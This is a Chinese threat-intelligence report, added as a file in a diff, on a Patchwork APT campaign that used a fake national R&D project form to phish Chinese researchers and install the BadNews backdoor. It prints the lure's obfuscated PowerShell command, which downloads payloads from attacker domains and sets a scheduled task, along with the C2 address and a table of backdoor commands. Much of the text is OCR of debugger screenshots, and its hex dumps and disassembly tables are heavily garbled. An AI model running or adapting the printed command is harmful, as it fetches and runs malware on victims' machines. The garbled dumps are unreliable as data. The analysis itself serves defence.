@@ -1,0 +1,294 @@
+# 以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析  
+
+原创猎影实验室网络安全研究宅基地2024年12月04日11:01浙江  
+
+  
+
+  
+
+## 概述  
+
+Patchwork组织又名Hangover、Dropping Elephant，最早披露于2013年。最早攻击活动可以追溯到2009年，主要针对中国、巴基斯坦等亚洲地区和国家进行网络间谍活动。在针对中国地区的攻击中，其主要针对政府机构、科研教育领域进行攻击。具有Windows、Android、macOs多系统攻击的能力。  
+
+近日，安恒猎影实验室在日常威胁情报狩猎中捕获了PatchworkAPT组织的攻击样本，相关样本以"国家重点研发计划'工程科学与综合交叉'重点专项2025项目指南建议表"为话题，针对国内科研相关的工作人员进行钓鱼攻击。  
+
+相关攻击活动以LNK文件作为初始攻击负载，引诱目标运行后，将下载PDF文件及EXE、DLL文件到本地，自动打开PDF文件以降低目标防备心理，并设置计划任务运行白文件。白文件运行后加载恶意DLL文件，在内存中多次解密加载执行Patchwork组织特马BadNews。此外我们发现该组织域名仿冒多个正常网站。  
+
+### 样本诱饵  
+
+本次捕获样本释放到本地的诱饵文件如下，内容为"国家重点研发计划'工程科学与综合交叉'重点专项2025项目指南建议表?  
+
+  
+file://E:/GoogleDownload/以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析(2024_12_614|59|59).html  
+
+以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析  
+
+
+<html><body><table><tr><td>所属领域</td><td>按照8个领域进行归属（空间科字、极端制道、信息、可 再生能源、海洋、医工、交通工程、材料）</td><td></td></tr><tr><td rowspan="2">类别 （可多选）</td><td>口1.工程科学问题 源自重大工程实施，需要解决的重要科学和技术问题 （100字左右）</td><td rowspan="2"></td></tr><tr><td>口2.综合交叉问题 需要多学科交叉、多领域融合的科学和技术问题（100字 左右）</td></tr><tr><td>必要性和意 义</td><td>聚焦国家重大工程、重大任务、重大应用的战略需求，说 明其必要性、紧迫性，以及对产业和技术的作用及影响， 以及应用场景等。（500字以内）</td><td></td></tr><tr><td>研究 内容</td><td>拟突破的关键核心技术、前沿科学技术领域等。（1000 字以内）</td><td></td></tr><tr><td>预期成果和</td><td>描述预期任务的标志性成果及关键核心考核指标。（100</td><td></td></tr></table></body></html>  
+
+关联到的其他样本释放诱饵文件主题如下为巴基斯坦国际航空有限公司伊斯兰堡售票处内部审计情况  
+
+  
+
+另一诱饵文件为：巴基斯坦第一大数据和通信网络提供商Zong的登录ID及密码  
+
+文件运行后使用Invoke-WebRequest命令分别从指定的URL下载PDF及EXE/DLL文件，并将其保存到指定的本地路径（具体URL见附录IOC）;运行PDF文件并复制PE文件到指定目录，复制PDF文件到当前目录;3 创建名为WinUpdate的计划任务以运行后续负载;删除运行过程中产生的中间文件。  
+
+87 commandlinearguments:powershell \$ProgressPreference $=$ 'SilentlyContinue';\$b='C:\Users';iw''r https://atus.toproid.xyz/ klhju_rdf_gd/ktdfersfr -OutFile \$b\Public\Project_Guideline.pdf;s''a''p''s \$b\Public\Project_Guideline.pdf;iw''r https://zon.toproid.xyz/pfetc_ksr_lo/jyuecvdgt -OutFile"sb\Public\hip";r''e''n -Path"sb\Public\hip"-NewName "\$b \Public\WerFaultSecure.exe";iw''r https://zon.toproid.xyz/aewbf_jsd_td/ktrgdysvt -OutFile "sb\Public\hello";r''e''nPath "\$b\Public\hello"-NewName "\$b\Public\wer.dll";c''p''i "\$b\Public\Project_Guideline.pdf"-destination .sch''ta''s''ks /c''r''e''a''te /S''c minute/T''n WinUpdate/t''r "\$b\Public\WerFaultSecure"/f;e''r''a''s''e \*d?.?n?   
+88 iconlocation:ProgramFiles(x86)&\Microsoft\Edge\Application\msedge.exe  
+
+下载的可执行文件将通过白 $^+$ 黑的方式加载恶意DLL文件。白文件和恶意DLL文件包含的证书信息分别如下：其中恶意DLL文件的证书早在今年3月的攻击活动就曾被Patchwork组织使用过。  
+
+  
+
+DLL文件被加载之后，将从自身读取一段数据解密为Shellcode，通过创建新线程加载  
+
+<html><body><table><tr><td>100027B9 100027BB 100027BD 100027BF 100027C3 100027C5</td><td>6A00 push 6A00 push 6A00 push FF742418 6A00 push push</td><td>0 push dword ptrss:[esp+18] 0</td><td>[esp+18]:werpSetExitListeners+10</td></tr><tr><td>100027c7 100027CD 100027CF</td><td>6A00 FF1510F00010 call 6AFF push</td><td>0 dwordptr ds:<CreateThread> FFFFFFFF</td><td></td></tr><tr><td>100027D0 100027D6 100027D8</td><td>50 FF15 08F00010 85F6 7428 81FF00100000</td><td>push eax cal1 dwordptr ds:[<waitForsingTeobject] test esi,esi ie wer.10002802 cmp edi,1000</td><td>esi:&"jtnJTbiojmKERrCCzXF7wq9zgI7k</td></tr></table></body></html>
+
+dword ptr ds:[1000F010"^w"]=<kerne132.CreateThread>  
+
+<html><body><table><tr><td colspan="2">内存1</td><td colspan="2">内存2 内存3</td><td colspan="2">内存4</td><td colspan="2">内存5 监视1</td><td colspan="2">[x=局部变量</td><td></td></tr><tr><td colspan="2">地址 十六进制</td><td colspan="3"></td><td colspan="2"></td><td colspan="2">ASCII eA7..A7..E0aza.z</td><td>结构体</td></tr><tr><td>03060000 03060010</td><td>E8C03703 DA3C9F</td><td>AD 66</td><td>00C03703 B87742</td><td>00 CBF2 FB C22CE</td><td>E5 BFE EE EF</td><td colspan="2">E3AD 5A 9B</td><td>U<..fwBuA,1*}.</td><td></td></tr><tr><td>03060020</td><td>7D A4 C4 DO</td><td>4B FF 23</td><td colspan="2">OA EE 00</td><td>00 00 00</td><td colspan="2">2A7D 7E C7 D8</td><td>ADKy#.1.</td><td></td></tr><tr><td>03060030 03060040</td><td>OC 20 9A CD 73</td><td>72 30</td><td>C9 32</td><td>E8 85 D3 AO 96</td><td>85 F5 63 64 3B</td><td>21 D5 1F FA CE 70</td><td>.rNnE2e.O.0 fsfo.y</td><td>.cd；ufp</td><td></td></tr><tr><td></td><td>CE 47 DC</td><td>AA</td><td>2E 8D</td><td></td><td>AC</td><td>07 ar AA</td><td></td><td></td><td></td></tr></table></body></html>
+
+file://E:/GoogleDownload/以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析(2024_12_614|59|59).html  
+
+Shellcode执行后会在内存中再次解密出一个PE文件  
+
+
+<html><body><table><tr><td>03060060 03060070</td><td>2B</td><td>4U DU DE 5F B4</td><td>A7 22</td><td>C9 246</td><td>MUM 56 671A</td><td>BF</td><td>94 8C DA</td><td>CL AD OF</td><td>JE 80 A3</td><td>1B</td><td>DL MU 10 C1</td><td>VT</td><td>E4A5</td><td>40 D6</td><td>GrI.M +P_SEV.</td><td></td></tr><tr><td>03060080</td><td>F1 OD</td><td>65 4723</td><td>387</td><td>82</td><td></td><td>5AF9</td><td>20</td><td>8D</td><td></td><td>CF 02CE08</td><td>52</td><td></td><td></td><td></td><td>E0319BB1 B37E1824</td><td>ne'"$g.U.fiRa1.± G#..Zu..f."~.$</td></tr><tr><td>03060090</td><td></td><td></td><td>606F7FBE</td><td>OF</td><td>DDA27C</td><td></td><td></td><td>93</td><td></td><td>B58620</td><td></td><td></td><td></td><td>12868DC2</td><td></td><td>0.%.Yc|.μ.</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>  
+
+<html><body><table><tr><td>03097FC0 03097FC2 03097FC3</td><td>FF36 56 57</td><td>pushdwordptrds:[esi] push esi push edi</td><td></td></tr><tr><td rowspan="3">03097FC4 03097FC9 03097FCB 03097FCF 03097FD0</td><td rowspan="3">E877190000 6A20 8D442434 53 50</td><td>cal1 3099940 push 20</td><td></td></tr><tr><td>lea eax,dword ptr ss:esp+34] push ebx push eax</td><td></td></tr><tr><td>cal1 3099964 add esp,18 lea ebx,dword ptrds:[edi+28] cmp dwordptrds:[edi+234],3</td><td></td></tr><tr><td colspan="4">03097FDC 83BF 3402000003 20</td></tr></table></body></html>  
+
+03097FC9   
+
+
+<html><body><table><tr><td>内存1</td><td>内存2</td><td>内存3</td><td></td><td>内存4</td><td>内存5</td><td>中</td><td>监视1</td><td>[x=局部变量</td><td>结构体</td><td></td></tr><tr><td>地址</td><td>十六进制</td><td>03 00 CB</td><td>F2 E 5 BF</td><td>E3 AD</td><td>5A DA</td><td>3C 9F AD C4 DO</td><td>ASCII 66 A7..</td><td>Eoaza.zU<..f 11*}.}ADK</td><td></td><td></td></tr><tr><td>03550010 03550020 03550030 03550040 03550050 03550060 03550070</td><td>03550000 CO 37 B8 77 FF 23 F1 FF 2E AA 83 56 BF 67 1A</td><td>42 FB OA EE 32 E8 8D AO E2 94 8C AD DA OF F9 20 8D A2 7C 6 BE 1F A7</td><td>C2 EE 00 00 00 85 D3 384 96 825 3E B2 80 1B 10 28 A3 CF 02 CE B5 86 ED 89 A8 23 08</td><td>F05861 AE2A7A 437686 277 8918</td><td>8275695688９ 9B D8 12040 D6 B1 4262</td><td>42036E64629E 9A B6 5F B4 8B</td><td>4095 23287 594868 A7 28 BE 59 BD D4 D4 CA</td><td>WBUA, CO. nE2e. 0.6!6.fsfo. cd; a> 2 Aaone 0. fIRal. ± f $ AO</td><td>.rN ufpGF1.A d+ SE A G# 0. %. Y/2 C-6Y65.60E</td><td></td></tr><tr><td>03550000 03550010 03550020 03550030 03550040 03550050</td><td>035500C0 28 51 CO 37 B8 77 FF 23 90 29 FO 5E</td><td>F4 6A 03 00 CB 42 FB C2 3E 47 00 5F 77 20 5E 77 EO</td><td>C9 C7 3E F2 E5 2C EE 00 00 5F 5E 77 5E</td><td>61 58 BF E3 AD EF 2A 7D 00 C7 77 60 8F 77 70 7C 77 40 3E</td><td>79 5A DA 9B 7D D8 OC 5E 5E 77 5F</td><td>5c E9 82 FA 3C 9F A4 C4 20 9A DO 5E 10 90 77 EO 97</td><td>扫 4A EA 4E AD 66 DO 4B 72 D1 5E 77 5E 77</td><td>'ofo #.÷8... 11 (Q0iEc>acxye.ueN A7..E Eoa:a.zu<..f WB0A,11*}.}ADK y#>G....~CO..rN MvvGMy、MvM（ wawwp|w..w</td><td></td><td></td></tr><tr><td>03550060 03550070</td><td>30 40 5E AO 3E 5F 5F</td><td>77</td><td>30 47 5E EO 40 5F</td><td>77 30</td><td>4B 60</td><td>77 10 5F</td><td>5E 5E</td><td>O@AwOGAw@>_wa.Aw >_wa@_woKw._Aw</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>75 73</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td>46</td><td></td><td></td><td></td><td></td></tr><tr><td>03550080</td><td>FO 3B</td><td>77</td><td>80 A2 5E</td><td>77 50</td><td>A1 5E 77</td><td>BO AD</td><td>B5</td><td>0；_w.tAwPjAw°.μw</td><td></td><td></td></tr><tr><td></td><td>00 03</td><td>B6 77</td><td>00 78 5E</td><td>77 70</td><td>1A 5E 77</td><td>70</td><td>5E</td><td>w.xAwp.wpFAw</td><td></td><td></td></tr><tr><td>03550090</td><td>50 3C EO BD</td><td>5F 77 10 75 75</td><td>83 40</td><td>75 DO 75 DO 75 EO</td><td>9B C9 42 C9 75 59 C9 75</td><td>DO 3E 41 69</td><td></td><td>P<_W..@uD.EuD>Eu</td><td></td><td></td></tr><tr><td>035500A0</td><td>C9 00 E2 C9</td><td>40 70 73 DO</td><td>E3 C9 E8 C9 7E 81</td><td>73 BO</td><td>27 7D 73</td><td>90 40 FO ED</td><td>C9 7A 7C</td><td>aVEu@aEuDBEu.AEu aEupeEuaYEu@izs p%.sD~.s°'}s0i|s</td><td></td><td></td></tr><tr><td>035500B0</td><td>70 BD 7F 81</td><td>73 EO</td><td>EC 7C</td><td>73 70</td><td>DO 8B 73</td><td>20 92</td><td>82 73</td><td>sailspD.s</td><td></td><td></td></tr><tr><td>035500c0 035500D0</td><td>80 9F</td><td>00</td><td>00 00</td><td>00 00</td><td>00 00</td><td>00</td><td>00 00</td><td></td><td></td><td></td></tr><tr><td>03551270</td><td></td><td>00 00</td><td></td><td></td><td></td><td>00</td><td>00</td><td></td><td></td><td></td></tr><tr><td>03551280 03551290</td><td>00 00 00 00</td><td>00 00</td><td>00 20 03 FF FF 00</td><td>00 4D</td><td>5A 90</td><td>00 03 00 00</td><td>00 00 00 00 00</td><td>MZ</td><td></td><td></td></tr><tr><td>035512A0</td><td>04 00</td><td>00 00 00 00 00 00</td><td>00 00 00 00 00 00</td><td>00 B8 00 00</td><td>00 00 00 00</td><td>00 00 00 00</td><td>00 00 00 00 00 00</td><td></td><td></td><td></td></tr><tr><td>035512B0 035512C0</td><td>40 00</td><td>00 00</td><td>00 10 01</td><td>00 00</td><td>00 00</td><td></td><td>00 60</td><td></td><td></td><td></td></tr><tr><td>035512D0 035512E0</td><td>00 00</td><td>01 4C</td><td>CD 21</td><td>3085</td><td>BA</td><td></td><td>B4</td><td>Lf!This</td><td>progr</td><td></td></tr><tr><td>035512F0</td><td>00 00</td><td></td><td>466</td><td>06946 6F 20</td><td>13206F 264</td><td>7056 0222</td><td>0264 620</td><td></td><td></td><td></td></tr><tr><td></td><td>21 B8</td><td></td><td></td><td>00 F3</td><td></td><td></td><td></td><td></td><td>berun</td><td></td></tr><tr><td></td><td>61 6D 69</td><td>20 9</td><td>61 6E 44 4F 53 00 00 00</td><td></td><td>2B 78</td><td>FD</td><td>4A 16 AE</td><td>am cannot</td><td></td><td></td></tr><tr><td></td><td>20</td><td>6E 20</td><td></td><td></td><td>32 15</td><td></td><td>AE</td><td>in DOS</td><td></td><td></td></tr><tr><td>03551300</td><td>24 00</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>mode.</td><td></td></tr><tr><td>03551310</td><td></td><td>00 00</td><td></td><td></td><td></td><td>AF</td><td>4A</td><td></td><td>o+xy.J.</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>B7 4A</td><td>16 AE</td><td>B7 4A 16</td><td>AE FC</td><td></td><td>BD</td><td>16</td><td></td><td>%J. D</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></table></body></html>  
+
+然后通过复制、抹去文件头等操作，最后在内存中加载  
+
+
+<html><body><table><tr><td>03098E20 57 03098E21 57 03098E22 FF535C 03098E25 85c0 03098E27 7415 03098E29 6AFF 03098E2B 50 03098E2C 03098E2F 03098E31 03098E4B 7509</td><td>push edi pushedi call dwordptr ds:[ebx+5c] test eax,eax je3098E3E push FFFFFFFF push eax</td><td>[ebx+5c]:createThread</td></tr><tr><td>FF5358 cal1 EBOD jmp 64:A118000000 mov</td><td>dword ptrds:[ebx+58] 3098E3E eax,dwordptr fs:[18]</td><td>[ebx+58]:waitForSingleobject</td></tr><tr><td>03098E37 FF7030 03098E3A FF542430 03098E3E 8B542410</td><td>pushdword ptr ds:[eax+30] cal1dword ptr ss:[esp+30] mov edx,dword ptr ss:esp+10]</td><td></td></tr><tr><td>03098E42 6A03 03098E44 58 03098E45 398330020000</td><td>push3 pop eax cmp dwordptr ds:[ebx+230],eax ine 3098E56</td><td></td></tr></table></body></html>
+
+dword ptr ss:[esp+30]=[0314F484]=04D400FA  
+
+03098E3A   
+
+
+<html><body><table><tr><td colspan="2">内存1</td><td colspan="2">内存2</td><td colspan="2">内存3 内存4</td><td colspan="2">内存5</td><td colspan="2">监视1</td><td>[x=]局部变量 ASCII</td><td colspan="2">结构体</td></tr><tr><td colspan="14">地址 十六进制</td></tr><tr><td colspan="14">04D400FA E8 73 04 00 00 E974 FE 8B EC 83 EC OC 8D 4D F4</td></tr><tr><td colspan="14">04D4010A</td></tr><tr><td>04D4011A</td><td>D5</td><td>04 8D</td><td>45 F4 50</td><td>E8 50</td><td>OB</td><td>E82EF7 FF 00 00</td><td>FF CC 55</td><td>68 74 8B EC</td><td>F8 83</td><td>.i.i..Moe.-yyhto O..EoPeP...IU.i.</td><td></td><td></td></tr><tr><td>04D4012A</td><td>25</td><td>80 1E</td><td>D6 04 00</td><td>83 EC</td><td>24 83</td><td>OD</td><td>84 10</td><td>D6 04</td><td>01</td><td>%..0...1$....O..</td><td></td><td></td></tr><tr><td>04D4013A</td><td>6A</td><td>OA FF</td><td>15 CC 50</td><td>D5 04</td><td>85 CO</td><td>OF</td><td>84 AC</td><td>01 00</td><td>00</td><td>j.y.1PO..A..-.</td><td></td><td></td></tr><tr><td>04D4014A</td><td>83</td><td>65 FO</td><td>00 33 CO</td><td>5356</td><td>57 33</td><td>C9</td><td>8D 7D</td><td>DC 53</td><td>OF</td><td>.e0.3ASVW3E.}Us</td><td></td><td></td></tr><tr><td>04D4015A</td><td>A2</td><td>8B F3</td><td>5B 90 89</td><td>07 89</td><td>77 04</td><td>89 4F</td><td>08</td><td>33 C9</td><td>89</td><td>.O....W..O.3E.</td><td></td><td></td></tr><tr><td></td><td>57</td><td>OC 8B</td><td>45 DC 8B</td><td>7D EO</td><td>89 45</td><td>F4</td><td>81 F7</td><td>47 65</td><td>6E</td><td>W..EU.}a.Eo.÷Gen</td><td></td><td></td></tr><tr><td>04D4016A 04D4017A</td><td>75</td><td>8B 45</td><td>E8 35 69</td><td>6E 65</td><td>49 89</td><td>45</td><td>FC 8B</td><td>45 E4</td><td>35</td><td>u.Ee5ineI.Eu.Ea5</td><td></td><td></td></tr><tr><td colspan="2">AAD4A10A Cr</td><td>74 CC</td><td>Cr AC</td><td>ro</td><td>4A</td><td>Ar</td><td></td><td>on</td><td>Cn</td><td>1</td><td></td><td></td></tr></table></body></html>
+
+file://E:/GoogleDownload/以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析(2024_12_614丨59|59).html  
+
+V4D4V10M UE 74 UL 4J LV 4V Vr OD JD ITL UL 04D4019A 90 8D 5D DC 89 03 8B 45 FC OB 45 F8 OB C7 89 73 ]u...Eu.Eo.C.s 04D401AA 04 89 4B 08 89 53 OC 75 43 8B 45 DC 25 FO 3F FF .K..S.uC.EU%O?y 04D401BA0F3DC006010074 233D60060200741C3D.=A...t#=...t.  
+
+最后在内存中加载的Shellcode实际是Patchwork组织的常用特马BadNews。该负载运行后首先创建名为"gqfffhj"的互斥体  
+
+if （CreateMutexA(0,1,"gqfffhj"）) if（GetLastError( $)\quad==\phantom{-}183$ { _loaddll(0);  
+
+获取UUID，根据UUID和文件路径编码生成字符串  
+
+$v6=$ strlen(v51[0]);  
+sub_4011E0(v6, v28); //根据UUID和文件路径生成RjFFQTRENTYtOEUxRCO4MjA2LTMxN  
+LOBYTE(v69) $=$ 1;  
+sub_403D60(v28，v29); //进一步加密->aBMHYu5QtOoAtE5/QbkacRvJqi1XxPbTWxjMPG  
+
+获取操作系统版本，重复上述操作  
+
+<html><body><table><tr><td>00241ED7 00241EDD</td><td>FF1568502600 A380252700</td><td>cal1 dword ptrds:[ <GetProcAddress> dword ptrds:[<&Getversion>],eax</td><td>eax:Getversion</td></tr><tr><td>00241EE2</td><td>mov FFDO call</td><td>eax</td><td>eax:Getversion</td></tr><tr><td>00241EE4</td><td>8BC8</td><td>mov ecx,eax</td><td>eax:Getversion</td></tr><tr><td>00241EE6</td><td>66:C1E8 08 OFB7D0</td><td>shr ax,8 movzxedx,ax</td><td>edx:Getversion</td></tr><tr><td>00241EEA</td><td colspan="3"></td></tr><tr><td colspan="4">eax=<kerne132.GetVersion></td></tr></table></body></html>  
+
+获取其他信息，如UserName、内外网IP及IP所在国家，依据获取到的信息 $^+$ 文件路径进行两次编码加密  
+
+$^{*}(\vee6+49)=\theta_{j}$   
+strcpy(v6,"https://myexternalip.com/raw");   
+$\begin{array}{r l}{\mathbf{\nabla}\vee7}&{{}=}\end{array}$ unknown_libname_3(20);   
+$^{*}\left(\vee7+12\right)=\theta$   
+$\begin{array}{r l}{{}\mathbf{\nabla}\vee9}&{{}=}\end{array}$ unknown_libname_3(100);   
+memset( $\vee9+47$ ，0，0x35u);   
+strcpy(v9,"https://api.iplocation.net/?cmd=ip-country&ip $\L=\mathbf{\Sigma}^{\W}$ ); $\vee10~=~\&_{\odot1}$  
+
+将所有加密后的信息拼接  
+
+
+<html><body><table><tr><td>00247181 00247188 0024718E 00247194</td><td>83BD 18FFFFFF0F 8D85 04FFFFFF 8DBD A4FEFFFF 0F478504FFFFFF</td><td>cmp dword ptr ss:[ebp-E8],F lea eax,dword dptr ss:[ebp-FC] 1eaedi,dwordptr ss:[ebp-15c]</td><td>ebp-FC]:"dSHXPP0JYsd3jE+uURPmWW==</td></tr><tr><td></td><td></td><td></td><td>ebp-15C]:"sVtd9hRcPK+A/iHv53rqaE0</td></tr><tr><td>0024719B</td><td></td><td>cmova eax,dword ptr ss:ebp-Fc] lea esi,dword ptr ss:[ebp-144]</td><td>ebp-FC]:"dSHXPPOJYsd3jE+uURPmWW== [ebp-144]:"F6hv1AasNQ75f3JWus3KDQ=</td></tr><tr><td></td><td>8DB5 BCFEFFFF</td><td></td><td></td></tr><tr><td>002471A1</td><td>83BD B8FEFFFF OF</td><td>cmp dword ptr ss:ebp-148],F</td><td></td></tr><tr><td>002471A8</td><td>8D95 D4FEFFFF</td><td>lea edx,dword ptr ss:[ebp-12c]</td><td>[ebp-12c]:"dfJdn+oj+oiA4vT/sapfxA=</td></tr><tr><td>002471AE</td><td>8985 BCFDFFFF</td><td>mov dword ptr ss:ebp-244],eax</td><td></td></tr><tr><td>002471B4</td><td>8D8D ECFEFFFF</td><td>lea ecx,dword ptr ss:[ebp-114]</td><td>[ebp-114]:"dSHXPP0JYsd3jE+uURPmWW=</td></tr><tr><td>002471BA</td><td>0F47BD A4FEFFFF</td><td>cmova edi,dword ptr ss:[ebp-15c]</td><td>ebp-15c "SVtd9hRcPK+A/iHv53rqaE0</td></tr><tr><td></td><td>8D85 8CFEFFFF</td><td>lea eax,dword ptr ss:[ebp-174]</td><td>[ebp-174]:"aBMHYu5Qt0oAtE5/QbkacRV</td></tr><tr><td>002471C1</td><td>83BD DOFEFFFF OF</td><td>cmp dword ptr ss:ebp-130],F</td><td></td></tr><tr><td>002471C7</td><td>FFB5 BCFDFFFF</td><td>pushdwordptr ss:[ebp-244]</td><td></td></tr><tr><td>002471CE</td><td>OF47B5 BCFEFFFF</td><td>cmova esi,dwordptrss:[ebp-144]</td><td>[ebp-144]:"F6hv1AasNQ75f3JWus3KDQ=</td></tr><tr><td>002471D4</td><td>83BD E8FEFFFFOF</td><td>cmp.dword ptr ss:[ebp-118],F</td><td></td></tr><tr><td>002471DB</td><td>57</td><td>pushedi</td><td>edi:&"ALLUSERSPROFILE=C:\\ProgramD</td></tr><tr><td>002471E2</td><td>0F4795 D4FEFFFF</td><td>cmova edx,dword ptr ss:ebp-12c]</td><td>[ebp-12c]:"dfjdn+oj+oiA4vT/sapfxA=</td></tr><tr><td>002471E3</td><td>83BD OOFFFFFF OF</td><td>cmp dword ptr ss:[ebp-100],F</td><td></td></tr><tr><td>002471EA</td><td>8BBD B8FDFFFF</td><td>movedi，dword ptr ss:[ebp-248]</td><td>[ebp-248]:"uedf"</td></tr><tr><td>002471F1</td><td>0F478D ECFEFFFF</td><td>cmova ecx,dwordptrss:[ebp-114]</td><td>[ebp-114]:"dSHXPP0JYsd3jE+uURPmWW=</td></tr><tr><td>002471F7</td><td>83BD AOFEFFFF OF</td><td>cmp.dword ptr ss:ebp-160],F</td><td></td></tr><tr><td>002471FE 00247205</td><td>56</td><td>push esi</td><td>esi:"1EA4D56-8E1D-8206-3158-C968AB</td></tr><tr><td>00247206</td><td>OF47858CFEFFFF</td><td>cmova eax,dword ptr ss:[ebp-174]</td><td>[ebp-174]:"aBMHYu5Qt0oAtE5/QbkacRv</td></tr><tr><td>0024720D</td><td>8BB5 COFDFFFF</td><td>movesi,dword ptr ss:ebp-240]</td><td></td></tr><tr><td>00247213</td><td>52</td><td>push edx</td><td>edx:&"ALLUSERSPROFILE=C:\\ProgramD</td></tr><tr><td>00247214</td><td>51</td><td>push ecx</td><td></td></tr><tr><td>00247215</td><td>50</td><td>push eax</td><td></td></tr><tr><td>00247216</td><td>57</td><td>push edi</td><td>edi:&"ALLUSERSPROFILE=C:\\ProgramD</td></tr><tr><td>00247217</td><td>68 C4E02600</td><td>push .26E0C4</td><td>#5%##S%##5%##S%S%039</td></tr><tr><td>0024721C</td><td>56</td><td>push esi</td><td>esi:"1EA4D56-8E1D-8206-3158-C968AB</td></tr><tr><td>0024721D</td><td>E8 AEE9FFFF</td><td>ca11 .245BD0</td><td></td></tr><tr><td>00247222</td><td>83C43C</td><td>add esp,3C</td><td></td></tr></table></body></html>  
+
+以POST的方式发送至C2：hxxps://weixein.info/1WrCVzW4kSDNbNTt/cqWf4vQlofzq  
+
+Fkc7.php  
+
+以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析  
+
+
+<html><body><table><tr><td rowspan="2">00245D14 00245D19</td><td colspan="2">6804192700</td><td rowspan="2">push.271904</td><td rowspan="2">271904:"weixein.info</td></tr><tr><td>FFB520FFFFFF</td><td>pushdword ptr ss:ebp-EO]</td></tr><tr><td>00245D1F</td><td>A328262700</td><td>mov</td><td>dwordptr</td><td>ds：[<&InternetconnectA>]，00272628:"InternetopenA"，eax:I</td></tr><tr><td>00245D24</td><td>FFDO</td><td>call</td><td>eax</td><td>eax:InternetconnectA</td></tr><tr><td>00245D26</td><td>898524FFFFFF</td><td></td><td>mov dword ptr ss:ebp-Dc,eax</td><td>[ebp-Dc]:RtTFreeHeap+46,eax:Inter1</td></tr><tr><td>00245D2C</td><td>85c0</td><td></td><td>test eax,eax</td><td>eax:InternetconnectA</td></tr></table></body></html>  
+
+<html><body><table><tr><td>eax=<wininet.InternetconnectA></td></tr><tr><td></td></tr></table></body></html>  
+
+<html><body><table><tr><td>00245D97</td><td>6A00 push</td><td></td><td></td></tr><tr><td>00245D99 00245D9B</td><td>6A 00 57</td><td>push push edi</td><td>edi:"HTTP/1.1</td></tr><tr><td>00245D9C</td><td>68 C0252700</td><td>push .2725c0</td><td>2725c0:"/1WrCVzW4kSDNbNTt/cqwf4vQ1</td></tr><tr><td></td><td></td><td>pushdword ptrss ebp-F4</td><td>[ebp-F4]:"POST</td></tr><tr><td>00245DA1</td><td>FFB5OCFFFFFF</td><td>pushdword ptrss: ebp-DC</td><td></td></tr><tr><td>00245DA7 00245DAD</td><td>FFB5 24FFFFFF</td><td>call eax</td><td>eax:HttpopenRequestA</td></tr><tr><td>00245DAF</td><td>FFDO 8985 E8FEFFFF</td><td>mov dword ptr ss:ebp-118],eax</td><td>eax:HttpopenRequestA</td></tr><tr><td>00245DB5</td><td>85C0</td><td>testeax,eax</td><td>eax:HttpopenRequestA</td></tr><tr><td>00245DB7</td><td>753B</td><td>jne.245DF4</td><td></td></tr><tr><td>00245DB9</td><td>FFB5OCFFFFFF</td><td>pushdwordptrss:ebp-F4]</td><td>[ebp-F4]:"P0ST'</td></tr></table></body></html>  
+
+C2返回指令以" $\$1$ "符分割，包含的部分指令及功能如下  
+
+
+<html><body><table><tr><td rowspan="2">00C85F81 00C85F82 00C85F88 00C85F89</td><td rowspan="2">52 FFB518FFFFFF 51 56</td><td rowspan="2">push edx push dword dptr ss:[ebp-E8] push ecx push esi</td><td rowspan="2">[ebp-E8]:"fufokin=aBMHYu5QtOoAtE5/ esi:"content-Type:application/x-w</td></tr><tr><td></td></tr><tr><td rowspan="4">00C85F8A 00C85F90 00C85F96</td><td>FFB5 E8FEFFFF FF9504FFFFFF</td><td>push dword ptrss ebp-118] cal1 dword ptrss ebp-FC]</td><td>[ebp-FC]:HttpSendRequestA</td></tr><tr><td>6A00</td><td>push</td><td></td></tr><tr><td>00C85F98 0F57C0 00C85F9B C78574FFFFFF0000000m0V</td><td>xorpsxmmo,xmmo dwordptrss:ebp-8c.0</td><td></td></tr><tr><td colspan="3"></td></tr></table></body></html>
+
+eax=<wininet.HttpopenRequestA>  
+
+<html><body><table><tr><td>指令</td><td>含义</td></tr><tr><td>3hdfghd1</td><td>读取指定文件，加密后上传至C2</td></tr><tr><td>3gjdfghj6</td><td>创建cmd进程执行指定指令，并将执行结果加密上传</td></tr><tr><td>3fgjfhg4</td><td>遍历文件及目录</td></tr><tr><td>3gnfjhk7</td><td>从指定URL下载后续负载保存到本地执行</td></tr><tr><td>3ngjfng5</td><td>仅下载文件</td></tr><tr><td>3fghnbj2</td><td>屏幕截图，加密回传</td></tr><tr><td>frgt45f</td><td>创建线程执行cmd指令</td></tr></table></body></html>
+
+dwordptr ss:[ebp-FC]=[012FF688<&HttpSendRequestA>] $=$ <wininet.HttpsendRequestA>  
+
